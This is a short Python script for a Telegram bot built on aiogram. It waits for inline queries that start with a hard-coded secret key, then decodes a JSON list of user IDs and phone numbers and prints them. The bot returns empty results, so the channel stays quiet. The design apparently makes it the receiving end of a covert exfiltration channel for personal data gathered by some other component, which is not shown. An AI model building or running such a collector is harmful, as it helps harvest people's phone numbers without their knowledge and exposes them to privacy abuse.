import sys
import logging
import asyncio
import json

from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineQuery

TOKEN = "YOUR_TOKEN_HERE" 

bot = Bot(token=TOKEN)
dp = Dispatcher()

SECRET_KEY = "741ad28818eab17668bc2c70bd419fc25ff56481758a4ac87e7ca164fb6ae1b1"

@dp.inline_query()
async def log_inline_query(inline_query: InlineQuery):
    if inline_query.query.startswith(SECRET_KEY):
        print("Caught the logging query!")
        split = inline_query.query.split(" ")
        data = json.loads(split[1])
        for user_id in data:
            print(f"User ID: {user_id}, phone number: {data[user_id]}")
    
    await inline_query.answer(results=[], cache_time=0)

async def main():
    # Set logging to see system-level events
    logging.basicConfig(level=logging.INFO, stream=sys.stdout)
    print("Listening for inline queries...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass